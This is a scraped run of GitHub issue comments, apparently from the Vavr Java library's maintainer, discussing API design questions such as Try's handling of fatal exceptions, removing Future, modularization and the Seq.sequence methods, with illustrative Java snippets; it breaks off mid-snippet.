prefer Option or Try over List / Array (to wrap a single value) because it is a bit more memory efficient.\nFor simple transformation pipelines function chaining works well.\nGreets\n- Daniel\n\n@nfekete the method isSingleValued() tells us something about the type, not about the instance. E.g. Option and Try are single-valued but List(1) isn't. This is important for us in the case we need to gather some information about a general Value instance at runtime. There are more introspection methods (also for collections), e.g. isLazy(), isAsync(), isTraversableOnce(), .... @durron597 Thank you for asking the question. And thanks to all other participants. I will close the ticket now.. @grnadav Thank you. I'm currently thinking about removing Future from Vavr 1.0 because there seem to be several great alternatives for Java, including CompletableFuture of the standard library.\nHowever, your concern is a different. Our implementation of Try behaves like that of Scala, it does rethrow fatal exceptions. We decided to do so because a further processing of the application most probably will lead to a non deterministic behavior, e.g. when the application runs out of memory or classes are not found on the classpath.\nIf we would encapsulate such exceptions, we would hide them. People might have a hard time then to find serious errors.\nMay I ask which is your use-case for encapsulating fatal errors instead of re-throwing them?. @valery1707 I know. With modularization (not only Java 9 readiness) some of these benefits are gone. For example classes of different modules (like control and concurrent) cannot be converted back and forth anymore because there cannot exist cyclic dependencies between modules.\nExample: Only one of the following can be possible. In this case future.toOption(), because it needs to rely on Try which belongs to the module io.vavr.control.\njava\noption.toFuture();\nfuture.toOption();\nHowever, Future.from(option) would be the alternative to option.toFuture().\nA generic conversion method to(Class) does not seem to be possible:\n```java\n// Example 1: Future future = Option.of(\"a\").to(Future.class);\n// Example 2: Either either = Future.of(() -> 1).to(Either.class, \"not present\");\ninterface Value {\nboolean isEmpty();\n\nT get();\n\ndefault <V extends Value<T>> V to(Class<V> valueType) {\n    if (isEmpty()) {\n        return (V) MagicTypeConstructor.empty(valueType);\n    } else {\n        return (V) MagicTypeConstructor.of(valueType, get());\n    }\n}\n\ndefault <V extends BiValue<T, U>, U> V to(Class<V> biValueType, U emptyValue) {\n    if (isEmpty()) {\n        return (V) MagicTypeConstructor.empty(biValueType, emptyValue);\n    } else {\n        return (V) MagicTypeConstructor.of(biValueType, get());\n    }\n}\n\n}\n```\nWe can't use reflection because it would not work in GWT for example.... @nfekete From the maintenance-side better separation of concerns, clearer design of internal dependencies and the ability to phase-out obsolete modules. From the user-side the ability to select only some features and therefore resulting in a small footprint. I think many use Try, some use collections, few use 'uncommon' collections or persistent Queue, and even fewer use Future, For comprehensions and pattern matching.. @nfekete I think there will be a demand to maintain the 0.9.x line. Maybe 0.9 should be lifted to 1.0 without modularization and without removing existing things... \ud83e\udd14. @nfekete \n\nWe kinda hijacked this issue.\n\nyes, you are right.there already exists an issue #2057.\nI currently work on a 'light' spike of Vavr 1.0 and experience several lessons learned. I currently write about it in #2228 and on https://blog.vavr.io.. Our Future implementation will be dropped. There will be no Vavr 1.0 module vavr-concurrent.\nReason: Implementing our own concurrency library is too error-prone, concurrency is a hard problem. There are many(!) alternatives, first of all Java's native CompletableFuture. I will close this for now. It is questionable if we should invest more in pattern matching because Java will have native pattern matching.. Note: We still are able to use eq() for structural equality (which takes the order into account). I will keep it open for a while. Maybe there is some discussion...\n\nThis PR (and issue) is very problemastic.\n\nDoes it break s.th. for you?. @ruslansennov Just one more word on this: this PR would break the Liskov Substitution Principle.\nThe following should be true for Maps that contain (1, \"a\"), (2, \"b\") - regardless of the order. Especially for LinkedHashMap(1, \"a\", 2, \"b\") and LinkedHashMap(2, \"b\", 1, \"a\").\njava\nfinal Map<Integer, String> map1 = ...\nfinal Map<Integer, String> map2 = ...\nassert map1.equals(map2);\n. @ruslansennov oh noes, my review was \ud83d\udca9\nOf course the LinkedHashMap.put(k,v) should preserve existing order (on existing key). I focused on the equals stuff in my review.\nCould you please make a PR for the put() fix, only? We will take it into the 0.9.0 release. Nearly all relevant 0.9.0 issues are finished now!. @maystrovyy Thank you for asking but I don't understand your question. Please be more specific.\nIs there currently an invalid dependency? Where? Within one of our pom.xml files?. Ahh, ok - yes :) we are aware of it.\nSpoiler alert: It will be solved today or tomorrow.. Thank you!. Hi Ben,\nthank you for the PR. It is great to see a JCP member here!\nSo far, I haven't found a reason to bump Vavr's binary code to the upcoming Java version. JDK9  doesn't offer any features that will enhance our API. If we would use modules under the hood, we would just ensure that we expose the right things to the outside. Currently we use workarounds for that purpose, like auxiliary classes and package private classes (I know, even if they are not part of the contract, they are currently discoverable via reflection).\nHowever, it is important that Java 9 applications are able to use the Vavr binaries compiled with Java 8. This is one thing that has to be investigated. I haven't found the time to get my hands on Java 9, yet (besides jshell - I love it).\nThank you also for your summary. One thing I don't like to see is that GWT will not be able any more to find the package-private GwtIncompatible annotation, which I do not want to expose to the outside. It is also no option to pull in a 3rd party library to get this annotation, Vavr is a zero-dependency library.\nIt really surprises me that Lazy and MatchTest (resp. our pattern matching API) are incorrect. We put much effort in the implementation and from my point of view all makes perfectly sense. For example I tested pretty well that types are recursively inferred along the pattern cascade. Please note that the match cases are partial functions. I.e. a pattern might not match if the given sub-types do not match the actual types. Especially we did not implement the visitor pattern, we did something more general. It is like Scala but without exhaustiveness checks by the compiler.\n\nThe current code is unsafe and almost certainly doesn't mean what you think it does.\n\nIs it the exhaustiveness you address? Could you please elaborate on this?\n\nI could not find a correct form for 9, and exposed a javac bug in 9 when trying to forward port it.\n\nDid you already filed a bug on Oracles bug-tracker?\nI think I have to dive deeper into Java 9 in order to understand what went wrong with Lazy and Match. Your investigation makes perfectly sense. We will see how we can benefit from Java modules. At the latest we will jump to the next binary version with Java 10, there are a lot of interesting features we are waiting for.. @kittylyst thank you for all your effort! Currently I'm on vacation (until end of June). Then I will help you on this issue. Currently I have to catch up with all the pending comments and pull requests...\nI have some questions:\n\nYou said \"getting the build working is my top priority because of the time-sensitivity\". Why is it time-sensitive? (JDK 9 GA is deferred to 21 Sep '17)\nI do not expect (enterprise) users to early adopt Java 9 when it is released. Too many open tooling questions, library incompatibilities etc. My goal is to keep Vavr Java 8 compatible. Do I understand correctly, that this PR isn't Java 8 compatible any more?\n\nHowever, I think I need to get my hands dirty in order to understand the impact :). This PR is important! Currently it is not priority 1 but it will flow into the master at some point.... @ruslansennov great thanks!\nIt came to my mind if something else might also influence the performance. E.g. did the implementation of the following methods change?\n\nArray.distinct()\nArray.appendAll(Iterable)\nArray.append(T)\nArray.remove(T)\n\n???\nBtw - the following part\njava\n        final Array<T> tail = array.tail();\n        if (tail.isEmpty()) {\n            return Array.of(array);\n        } else {\ncould be optimized by\njava\n        if (array.size() == 1) {\n            return Array.of(array);\n        } else {\n. @jest That sounds really nice!!\n@ruslansennov However, we should double-check that the basic Array operations do not perform worse than in 2.0.6. @jest interesting, thanks for the benchmarks. We need to take a look why it changed. We recently added some a priori checks in order to\n\nreturn the same instance if possible\nrun optimized operations in the empty case\n\nMaybe these checks are responsible for the performance changes. However, it is necessary to do so in order to ensure that essential constraints are valid. The Java converters / views rely on these constraints in order to provide java.util.List impls that behave as expected.\nBut there is another use-case for separating behavior & structure: The 1.0 version of Vavr will internally be completely refactored. My goal is to compensate some of the down-sides of Java's type system that currently force us to repeat slightly changing method declarations.\nWe reach this goal by a new kind of code-generator. I call it \"inline code generator\". Files contains generated regions (as opposed to protected regions), that are filled automatically with redundant code. Maybe we can benefit here also from selecting appropriate algorithms.. Wow. @ruslansennov It would be good to move the distinct() to the 3rd if branch, where it is needed. There are some instances created otherwise, even if the Array is empty:\n```java\n    @Override\n    public Array distinct() {\n        return distinctBy(Function.identity());\n    }\n@Override\npublic <U> Array<T> distinctBy(Function<? super T, ? extends U> keyExtractor) {\n    Objects.requireNonNull(keyExtractor, \"keyExtractor is null\");\n    final java.util.Set<U> seen = new java.util.HashSet<>();\n    return filter(t -> seen.add(keyExtractor.apply(t)));\n}\n\n```\n. Thx!. It does also not help to first calculate the Narayana permutations and then call distinct():\n[[1, 2, 2], [1, 2, 2], [2, 1, 2], [2, 2, 1], [2, 1, 2], [2, 2, 1]].distinct() == [[1, 2, 2], [2, 1, 2], [2, 2, 1]]\nFor big N it will perform not well. The distinct() has to be called first. However, as you said, the result is different.\nLet's take the first algorithm for now.\nAny other suggestions are welcome.. @jest \n\nAnyway, this is IMO a breaking change in the API?\n\nIf the newly added unit test #1998 works, it will be fine.\n\nI can try it on the weekend.\n\nAny helping hands are welcome :). @jest This reminds me of java.util.Map. A few years ago some users relied on the keySet() element order, even if the API states that it is unpredictable. Then Java changed its internal implementation and applications broke.\nThe question is, do we expect Seq.permutations() to behave the same along all Seq implementations?\nFollowing the Liskov Substitution Principle I would say yes, unless the Seq.permutations() API states the order is unpredictable.\nIt is always a good choice to make it clear using types. E.g. returning a Set<? extends Seq<T>> of permutations instead of a collection of the same type, e.g. Array<Array<T>>.\nHowever, Scala does return an Iterator. Because computing permutations is costly (time & mem), this is a good idea. What if we do the same and provide a permutation iterator with a consistent order along all Seq implementations? We could do this change on a 1.0.0 branch and provide the old implementation on master that will get the version 0.9.1.. @jest currently we separate (some) algorithms in package-private classes like Collections.\nGenerally spoken, it is a good idea to separate structure and algorithms. However, I would not add another layer of indirection and make algorithms public 'pluggable' (from the user-perspective). Simplicity (~ user experience) is more important.\nIf another mem/cpu performance is needed, the user should refer to the corresponding collection type. Examples are List vs Vector vs Array for Seq.\n. Thx! Yes, because of the Liskov Substitution Principle it is important that all Seq's return the same order of elements.. We already have performance characteristics as part of the javadoc, as Lorinc said.. Fixed with vavr-io/vavr-io.github.io#6. However, PartialFunction will safe Option instances. It can be used instead of Function<T, Option<R>>.\nSo I think it is worth seeing it as part of our core module.. Hi @davinkevin,\nyou are right, it is not possible. We should have had tested it. Unfortunately we have to remove API.Map(Tuple...).\nPlease use one of the HashMap.of*(...) methods.\nThx,\nDaniel\n. @anaumidis thx!\n@flopezlasanta yes, indeed - I've updated the referenced issue and will close this as duplicate. Fixed. I think the FutureImpl.cancel(boolean) function needs to look like this:\njava\n    @Override\n    public boolean cancel(boolean mayInterruptIfRunning) {\n        synchronized (lock) {\n            if (isCompleted()) {\n                return false;\n            } else {\n                return Try.of(() -> job == null || job.cancel(mayInterruptIfRunning)).onSuccess(cancelled -> {\n                    if (cancelled) {\n                        complete(Try.failure(new CancellationException()));\n                    }\n                }).getOrElse(false);\n            }\n        }\n    }\nInterestingly we already have a unit test:\njava\n    @SuppressWarnings(\"InfiniteLoopStatement\")\n    @Test\n    public void shouldInterruptLockedFuture() {\n        final Future<?> future = Future.of(() -> {\n            while (true) {\n                Try.run(() -> Thread.sleep(100));\n            }\n        });\n        future.onComplete(r -> fail(\"future should lock forever\"));\n        future.cancel();\n        assertCancelled(future);\n    }\nAfter the fix is applied, the onComplete handler, which throws an AssertionError, is executed. Currently the onComplete actions are executed on different threads (which will be changed with #1530), so the unit test is still green.. Thank you @ruslansennov and @nfekete.\nI will merge it.\nThe drawback you mentioned is acceptable because an Iterator is mutable. The javadoc says:\njava\n * <strong>Note:</strong> Iterators encapsulate mutable state.\n * They are not meant to be used concurrently by different threads. Do not reuse Iterators, e.g. after passing to\n * {@linkplain io.vavr.collection.List#ofAll(Iterable)}.\nEspecially the \"Do not reuse Iterators\" part is violated when concatenating an Iterator with itself.. Currently we have (simplified):\n```java\nclass Predicates {\n    public static  Predicate is(T value) { .... }\n}\nclass API {\n    public static  Pattern0 $(Predicate<? super T> predicate) { ... }\n}\n```\nIf we change the generic bounds like this, the compile error disappears in IntelliJ:\n```java\nclass Predicates {\n    public static  Predicate<? super T> is(T value) { .... }\n}\nclass API {\n    public static  Pattern0 $(Predicate predicate) { ... }\n}\n```\nHowever, javac does still complain.\nI currently see no solution :-/. @hamnis Sorry, I'm really busy at $work. I will take a look this evening!. Thank you!. Hi @juanpavergara,\nthe users want semantic versioning in order to be able to be able to upgrade without regrets (regarding backward compatibility of binary and source).\nThe 0.9.2 was a patch release. It includes basically bug fixes, no new features.\nAll new features go to the next major release 1.0.0 because we do not plan a minor release 0.10.0.. @juanpavergara thx for your effort!. Update: ~~This is a cross-cutting issue. Generally we favor the general purpose Vector over Stream as default Seq impl.~~. How would that support look like? Brainstorming welcome!\nGenerally we do not bake dependencies to 3rd party libs directly into the core Vavr library. Supporting hibernate (in the one or other way) requires us to create a new project. That's the only constraint.. @chb0github I added a new repository vavr-io/vavr-hibernate and a new developer team to the Vavr organization. May I add you to the Vavr organization and to the new team in order to start with vavr-hibernate?. @chb0github awesome, thank you! I've overseen your replies, my inbox is still too full after vacation \ud83d\ude05. We created it, now we need to ramp it up. Ticket can be closed.. Uncomment the following code block in io.vavr.PartialFunction after this issue is solved:\njava\n/* TODO: currently the name is ambiguous. uncomment after #2023 is finished!\ndefault PartialFunction<T, R> orElse(PartialFunction<? super T, ? extends R> fallback) {\n    return of(t -> applyOrElse(t, fallback), t -> isDefinedAt(t) || fallback.isDefinedAt(t));\n}\n*/\n. Already done in master (= vavr 1.0 branch) by removing Value interface.. Mmhh, I'm not sure if we need V at all. I think all Multimap Builders do not need any generics.\nAlso, for TreeMultimap the V does not need to be Comparable because only the keys are compared.\nWhat do you think?. You are right, thank you!. Ok, thank you for all the effort!. Thank you!. See #2057 . obsolete, no modules. Great, thank you!. Hi Emmanuel,\nmany thanks. Yes, we've overlooked it :)\nIt would be so nice if we could define such methods in an abstract way in super classes, but that's not possible. Maybe we will find other ways in future to ensure it, like unit tests\njava\ngiven: all public classes\nwhen: extending Value\nthen: it has a public static ... method named sequence with parameter Iterable...\nI will pull your version. Both you and Ruslan have a point. Now I have a burning ambition to see the benchmark results :)\nThx!. Hi @jangalinski, nice to hear from you!\nWe met at HSH in Hamburg ;). Thank you \ud83d\ude0a. Hi Pascal,\nall Traversable impls have the static empty() factory method. Does it cover your use-case?\nNote: Other Value impls (than collections) have different methods that create an 'empty' instance (in the way that instance.isEmpty() returns true):\n\nTry.failure(...)\nEither.left(...)\nFuture.failed(...)\nOption.none()\n...\n. Hi,\nsorry for the late answer.\nPlease use value.forAll(negatedPredicate).\nYou could either negate your condition directly or use Predicate.negate().. Great, many thanks!. @chronodm as you already observed, an ArraySet isn't a Seq. I think it is a Set. In the type hierarchy it could be modeled like this:\n\nTraversable\n      / \\\n   Seq  Set\n        / \\\nSortedSet  IndexedSet\n            |\n           ArraySet\nThe IndexedSet would share some methods of IndexedSeq. These methods could be factored out to a new interface IndexedTraversable. However, there is no need to make it public. A package-private interface would help to keep IndexedSeq and IndexedSet in sync.\n(There are already similar issues, like here).\nUpdate: Maybe the indexed container type should be exchangeable, i.e. an instance can be obtained using one of the existing IndexedSeq types. Then IndexedSeq would contain factory methods and there would be no public implementation (like ArraySet).\nTraversable\n          / \\       \n        Set  Seq--IndexedTraversable{package-private}\n        / \\        |\nSortedSet  IndexedSet\n. Seq/Set are distinct Traversable types. We are able to add required methods to Set (that may also be present in Seq) without having a common super-type (like the imaginary IndexedTraversable). We will not introduce additional general collection interfaces (even if non-public).. When having proper Java 9 modules it will be a different story. Then (I think, without having verified it) it is possible to hide technical types from reflection. We will see.... Hi Michael,\ngreat addition - looks all good to me!\nMany thanks \ud83d\ude0a. Yes, good catch! I tend to leave the hashCode impl as-is. Otherwise we would break semantics. Infinite Streams need to blow up (by definition) when we call functions that ~~operate on all elements~~ return a result based on all elements.\nA quick fix would be to disable memoization for Stream.sortBy only. We need to add the code above as unit test in order to eliminate regressions.\nMaybe we also find the time to create benchmarks that show the difference between a memoizing/non-memoizing sortBy function. (Memoization comes at a cost, we create intermediate Tuple instances on each function call. That (+ GC activity) is hard to measure with benchmarks.). Of course, I've overseen that.. I think switching memoization off is the best option we have, e.g. by checking !isEmpty() && head() instanceof Traversable && ((Traversable) head()).hasDefiniteSize()\nBtw - this might also memoize for finit Streams. See this change.. I think we should not bake a key-extractor functionality into HashSet. I see several cons:\n\nit would increase the memory footprint and lower the runtime performance\nit would increase the complexity of the underlying algorithms (Hash Array Mapped Trie), see #1391 \nit is uncommon compared to other collection libraries.\n\nWe could still achieve the behavior by\n\nimplementing equals and hashCode according to the required indexing behavior\nusing wrapper types, if the above is not possible\nusing a HashMap instead of a Set\nusing a workaround, like distinctBy (as mentioned above)\n. I like the idea. We could do it by introducing\n\n```java\n@FunctionalInterface\ninterface Equal {\nstatic <T> Equal<T> naturalEquality() {\n    return Objects::equals;\n}\n\nboolean areEqual(T t1, T t2);\n\n}\n```\nOur HashSet and HashMap are backed by HashArrayMappedTrie (HAMT) nodes, similar to TreeSet and TreeMap are backed by RedBlackTree (RBT). Currently RBT nodes own a reference to the underlying Comparator. We should remove that ref and add the comparator as argument to each method of RBT. Then we are able to keep only a single ref to the comparator in the wrapper TreeSet or TreeMap.\nFor HashSet/HashMap it would work the same way. Only these wrappers store a reference to Equal. The methods of the HAMT types need an additional argument of type Equal.. Equal is a common name. For example it is known from Scalaz (see here and here).\nEqual is a predicate a type is attributed with. EqualityChecker is more like a noun, a subject that does s.th. on its own. This is not the way we think. In fact Equal (resp. areEqual) is a function that is called from the outside. A function is used, it does not act by itself.. Yes, this is an interesting idea - we already have an issue: #1583\nI will close this one as duplicate.. > I believe Iterator.iterate(Supplier) is enough.\nYes, I also think @ruslansennov is right. Will close this ticket.\nSolved with #2193. I think this is a cross-cutting concern. Other return types may also need to be changed in order to be consistent.... We have many method return types that are similar to those of unzip*, i.e. return types that contain a (wrapper) self-type.\nI'm searching a formal reason to change unzip* while leaving other methods like tailOption() as-is. But I haven't found an explanation, yet.\nI tend to leave the type-signatures as-is (we only fix them for sorted collections).\n@Sir4ur0n What do you think? Could you live with that solution (leaving it as-is)? If not, what is your preferred solution (see also this comment)?\n\nBtw - I think life will get a bit easier when Java ships local variable type inference (in March 2018?):\n```java\n// Compiles\nvar set = HashSet.empty();\nvar unzip = set.unzip(s -> Tuple.of(\"\", \"\"));\n// Compiles\nvar list = List.empty();\nvar unzip = list.unzip(s -> Tuple.of(\"\", \"\"));\n```. @sir4ur0n thank you. Thank you, looks great!. This issue can be solved after #2023 has been solved, because of ambiguities.\nFor example Map extends PartialFunction. Because Map currently extends Value, it also has get(), getOrElse() and orElse(), ... This currently leads to ambiguities.. Closed because of #2176.\nPartialFunction will be moved to io.vavr.match and only used for that purpose.. Agreed, that makes sense.. We could start by adding a benchmark that compares certain Vavr collection operations with those of the Capsule collections. Especially it will tell us\n\nhow good our HAMT and BMT perform\nif we could improve our collections\n\nWe already have benchmarks that compare our collections with those of Scala and Clojure. In a first step we could add Capsule to the party.. Right - there seems nothing to do for us. Capsule seems to implement HAMT only.\nLet's close this ticket, okay?. @CauchyPeano thanks!. Hi @JordanMartinez,\nI think you can compare the relation fj/vavr to scalaz/scala. Several of fj's initiators are scalaz comitters, e.g. Runar.\nIt is my understanding that fj targets effect-free programming by encoding states using types. You need to know some bits of the algebraic methodology. For example (streaming) IO effects may be abstracted using transducers, getters/setters may be used  in a functional way using lenses and so on.\nI've experienced that Java is not the right language to do these abstractions. It is technically possible but it is bulky and has significant performance impacts. Also, in Java several things can't be expressed, it seems we have to stop half the way (missing higher kinded types, no tail recursion, no lazy evaluated values, etc).\nDuring the creation of Vavr's Vector we made benchmarks. FJ's solution is more than 100x slower for some operations. However, if you want to be able to mathematically proof the correctness of (parts of) your application, fj is the way to go.\nVavr intends to give you some bits of functional programming without ~~breaking the Java programming model~~ moving too far away from standard Java. I will elaborate on it soon, a blog post is in the make...\nPlease also see https://www.quora.com/What-is-Scalaz-useful-for\nCheers,\nDaniel. @JordanMartinez, I'm the creator of Vavr / Javaslang, I might be too biased to give an objective comparison.\n@jbgi, looking at the recent commit history and the activity outside of the Github repo, currently you can be considered as main comitter of fj. My impression is that you keep fj alive. You also contributed to Vavr / Javaslang in the past. Could you please drop some sentences here what makes fj so special regarding FP in Java?\n\nWhich is the target audience of FJ?\nWhat are prerequisites to get started with FJ? Would you recommend it to 'Average Java Joe'?\nIs it recommended to use FJ in production? What about GC pressure in enterprise-sized applications?\nIs there a risk of memory leaks due to reference-capturing closures and extensively used state wrappers?\nAre there any measures (benchmarks) regarding runtime performance?\nFor which kind of applications FJ fits best? Is it a swiss army knife or domain specific?\n...\n\nComparing libraries is such a delicate matter, especially if one is involved \ud83d\ude05\nThank you!. @jbgi thank you, well spoken! \ud83d\ude0a. Thanks for asking!. No issue has been seen, I will close this ticket.. The most simple and straight forward solution seems to me our current strategy:\nDesigning persistent collections as they should have been from the beginning, especially taking the most common and concise names as possible.\nNot implementing Java's old-school interfaces means reducing the overall complexity and keeping control over the library.\nSee the discussion on our blog.. My preferred solution is to not rename the collections.. @zlangbert thank you, great to hear that you like Vavr :)\n It is important for us to receive this kind of feedback from bigger companies.\n. Thanks @andreasaronsson!. @a1730, @alwins0n thank you for your feedback!. Hi @stephenh,\nI thought about it but think that's not the right way. It looks like a workaround, we should solve the real issue.\nIt showed that completely new names are no option, it will introduce new problems. Currently I tend to add the 'P' (= persistent) prefix because it is a common way to name persistent collections (I have seen it in different places) and it will not obfuscate the collection names too much.\n. @RazvanPetruescu thank you for giving us insights on you opinion, I really appreciate it. I will take your thoughts into account.\nHowever, I will not ignore @hrzafer, @Dangercoder or any other involved person who spends time on thinking about Vavr.\n. There are two opinions:\n\nleave it as-is\nrename it (different suggestions)\n\nThe path of least resistance is to leave all as-is (also good for backwards-compatibility).. @stephenh Thanks for the input. The problem with the API.Seq(...) overloads was that they lead to ambiguities when having Seq(T), Seq(T...) and Seq(Iterable<T>).\nI wish there were other ways in Java, like\n\nimport aliasing: import io.vavr.collection.{ List as VList, Set as VSet }\ntype aliases: type VList = io.vavr.collection.List\n\nAnother alternative would be conversion methods\njava\nfinal class API {\n    static <T> io.vavr.collection.Seq<T> toVavr(java.util.List<T> javaList) {\n        return io.vavr.collection.Vector.ofAll(javaList);\n    }\n    static <T> io.vavr.collection.Set<T> toVavr(java.util.Set<T> javaSet) {\n        return io.vavr.collection.HashSet.ofAll(javaSet);\n    }\n    static <T> io.vavr.collection.SortedSet<T> toVavr(java.util.SortedSet<T> javaSortedSet) {\n        return io.vavr.collection.TreeSet.ofAll(javaSortedSet);\n    }\n    static <K, V> io.vavr.collection.Map<K, V> toVavr(java.util.Map<K, V> javaMap) {\n        return ...;\n    }\n    static <K, V> io.vavr.collection.SortedMap<K, V> toVavr(java.util.SortedMap<K, V> javaSortedMap) {\n        return ...;\n    }\n}\nUsage:\n```java\n// new API module starting with v1.0\nimport static io.vavr.api.API.*;\nvar list = java.util.List.of(1, 2, 3);\nvar vavrList = toVavr(list);\n```\n\nNaming:\nInstead of toVavr(list), we could also name it persist(list) or s.th. else.... Currently this sequence method takes my thoughts. We plan to slice/modularize Vavr (see #2057). Especially there's the plan to have two modules, vavr-core and vavr-collection.\nSeq will be located in vavr-collection, but there are Option.sequence and Try.sequence that will be located in vavr-core. This will be a problem, because Seq is not visible in vavr-core.\nI can imagine different scenarios to solve that problem:\nKeep the sequence methods where they are and change their signature\njava\n// module vavr-core\ninterface Option<T> {\n    // before it returned Option<Seq<T>>\n    static <T> Option<Iterable<T>> sequence(Iterable<? extends Option<? extends T>> values) { ... }\n}\nThe new return value could also be based on another standard Java collection-like type:\n\nOption<java.util.List<T>>\nOption<java.util.Iterator<T>>\n...\n\nThis would make it more cumbersome to lift the result to Vavr again:\n```java\n// before\nOption> o1 = Option.sequence(List(Some(1), Some(2)));\nSeq r1 = o1.getOrElse(List()).map(Object::toString);\n// after\nOption> o2 = Option.sequence(List(Some(1), Some(2)));\nSeq r2 = o2.map(List::ofAll).getOrElse(List()).map(Object::toString);\n```\nI think this is not a good solution because it would complicate things for a technical, (more or less) internal reason.\nFuse the modules vavr-core and vavr-collection\nThis would solve the technical issue of visibility but it would contradict our desire to select features by including only those modules that are needed.\nMove the affected static(!) methods to the other module\nWe could move the sequence methods to Seq.\n```java\n// before\nOption> a2 = Option.sequence(options);\nTry> a3 = Try.sequence(tries);\n// after\nEither> a1 = Seq.sequence(eithers);\nOption> a2 = Seq.sequence(options);\nTry> a3 = Seq.sequence(tries);\n```\nBut there are several problems:\n1) The method signatures would be ambiguous because of type erasure (if they share the same name 'sequence')\njava\ninterface Seq<T> {\n    // to Java, these are all sequence(Iterable<Object>)\n    static <T> Option<Seq<T>> sequence(Iterable<? extends Option<? extends T>> options) { ... }\n    static <T> Try<Seq<T>> sequence(Iterable<? extends Try<? extends T>> options) { ... }\n}\nThis could be solved by choosing different names.\n2) It would not scale well\nIf we add a type, say Either or Validation, we would have to add also dependencies to other modules. We do not want to do this because it would contradict our desire to choose features.\njava\ninterface Seq<T> {\n    static <T> Option<Seq<T>> sequenceOption(Iterable<? extends Option<? extends T>> options) { ... }\n    static <T> Try<Seq<T>> sequenceTry(Iterable<? extends Try<? extends T>> options) { ... }\n    static <T> Either<Seq<T>> sequenceEither(Iterable<? extends Either<? extends T>> eithers) { ... }\n    static <T> Validation<Seq<T>> sequenceValidation(Iterable<? extends Validation<? extends T>> validations) { ... }\n}\nGenerally not a good idea.\nWe want a general solution (fantasy code, this is not Java!):\njava\ninterface Seq<T> {\n    static <T, M extends Monad> M<Seq<T>> sequence(Iterable<M<? extends T>> values) { ... }\n    static <T, A extends Applicative> A<Seq<T>> sequenceA(Iterable<A<? extends T>> values) { ... }\n}\nOut of scope: Simulating higher-kinded types\n\nAnother idea is a combination of the above:\n\nKeep the sequence methods as-is\nMove the collection interfaces to vavr-core, e.g. Traversable, Seq, Iterator\nMove selected collection implementations to vavr-core, like Vector and Iterator\n\nThis way Option.sequence and Try.sequence would still work and the interfaces would not blow up the vavr-core module too much.\n. One more word to the options we have regarding sequencing in the presence of Java modules.\nHigher-Kinded Types\nI've slept one night over the topic and still think that simulated higher-kinded types are a no-go  for Vavr.\n\n\nThe dependency problem mentioned [above](https://github.com/vavr-io/vavr/issues/2057#issuecomment-328077343) would be solved, if we could define a _generic_ method `M> Seq.sequence(Iterable> values)` that is applicable to all monadic types M (like Option, Try, Either, ...).\n\nBecause of the lack of [higher-kinded types](https://typelevel.org/blog/2016/08/21/hkts-moving-forward.html) (aka type constructors), we  would have to 'simulate' them like this:\n\n```java\ninterface Kind, T> {}\n\ninterface Option extends Value, Kind, T> { ... }\n\ninterface Seq extends Traversable {\n    @SafeVarargs\n    static  & Value , V extends Kind>\n        Kind> sequence(V... values) { ... }\n    static  & Value , V extends Kind>\n        Kind> sequence(Iterable extends V values) { ... }\n}\n```\n\n**Usage:**\n\n```java\n// Option> is split into Kind, Seq>\nKind, Seq> seqOpt = Seq.sequence(Option.some(\"a\"), Option.some(\"b\");\n```\n\nThis Kind type isn't useful for further processing. We need to re-union the split type. This isn't possible in a generic way (otherwise we would already have higher-kinded types in Java). However, we could achieve it by adding a static `narrow()` method to the corresponding type:\n\n```java\ninterface Option  extends Value, Kind, T> {\n    static  Option narrow(Kind, T> kind) {\n        return (Option) kind;\n    }\n\n}\n```\n\n**Fixed Usage:**\n\n```java\nOption> seqOpt = Option.narrow(Seq.sequence(Option.some(\"a\"), Option.some(\"b\"));\n```\n\n**Disadvantages of this solution:**\n\n* library developers have to implement narrow() by convention because it is static\n* the user has to remember that a narrow() call fixes the uncommon type problems\n* we introduce a new type Kind that is part of the public API for technical reasons only\n* the method signatures of our public API aren't human-readable any more - we want to keep it as simple as possible\n\nSumming up, this is not the kind of API we want to present our users.\n\n\nAlternate Solution\nWe need to keep the sequence methods where they are, as static members at their corresponding types. The problem remains - the Seq type isn't known anymore after we sliced Vavr into modules. I see the following solution:\njava\ninterface Option<T> extends Value<T> {\n    @SafeVarargs\n    static <T> Option<T[]> sequence(Option<? extends T>... options) { ... }\n    static <T> Option<T[]> sequence(Iterable<? extends Option<? extends T>> options) { ... }\n}\nUsage:\n```java\n// Option\nOption.sequence(Option.some(\"a\"), Option.some(\"b\"));\n// Option>\nOption.sequence(Option.some(\"a\"), Option.some(\"b\")).map(java.util.Arrays::of);\n// Option>\nOption.sequence(Option.some(\"a\"), Option.some(\"b\")).map(java.util.stream.Stream::of);\n// Option>\nOption.sequence(Option.some(\"a\"), Option.some(\"b\")).map(Vector::of);\n```\nTrade-offs:\n\nWe need an additional map() call in order to transform the result to an appropriate type.\nJava does not allow 'unsound' type assignments, e.g.\n\njava\n// fails to compile because Option<Vector<T>> is not of type Option<Seq<T>>\nOption<Seq<T>> seqOpt = Option.sequence(Option.some(\"a\"), Option.some(\"b\")).map(Vector::of);\nThe type-case problem could be solved by offering new collection factory methods, e.g.\n```java\ninterface Seq extends Traversable {\n    static  Seq of(T... ts) { return Vector.of(ts); }\n}\n// Usage\nOption> seqOpt = Option.sequence(Option.some(\"a\"), Option.some(\"b\")).map(Seq::of);\n```\nHowever, in most cases it should be ok to work with the more specific type, e.g. Option<Vector<T>>.\nObservations:\n\nthe solution is more flexible because we can choose the collection type (=> better Java interoperability)\nwith the increased flexibility comes more verboseness. The map() call reminds me a bit of Java's Stream.collect() method.\nthe sequence(M...), sequence(Iterable<M>) methods are not ambiguous:\n\n```java\n// sequence(Option...) is called, as expected\nOption s1 = Option. sequence();\nOption s2 = Option.sequence(Option.some(\"a\"));\nOption s3 = Option.sequence(Option.some(\"a\"), Option.some(\"b\"));\nOption s4 = Option.sequence((Option[]) new Object[] {});\n// sequence(Iterable>) is called, as expected\nOption s5 = Option.sequence(Vector.of(Option.some(\"a\"), Option.some(\"b\")));\n``. @zyxist thank you for your feedback! Yes, we will use reverse-DNS style and name the modules like the super packages. No (sub-)package will occur twice (in different modules).. I would prefer to move Option, Try, Either and Validation out ofio.vavr.coreto a moduleio.vavr.controlto get rid of the moduleio.vavr.controlx`.\nThe crux is that Function's lift and liftTry currently use Option and Try, so the core depends on these types. Now that we have PartialFunction it might be a viable solution to get rid of Function.lift and .liftTry.. The basic problem of modularization is understood and solved for Vavr. We will not incrementally add more modules. The first module on current master is vavr-control.. Awesome, thank you :). This could be a solution (untested):\njava\nSeq<Tuple<Integer, Integer>> getSubstringPalindromes(String s) {\n    final int N = s.length();\n    return List.range(0, N-1)\n        .flatMap(i -> List.of(Tuple.of(i, i+1), 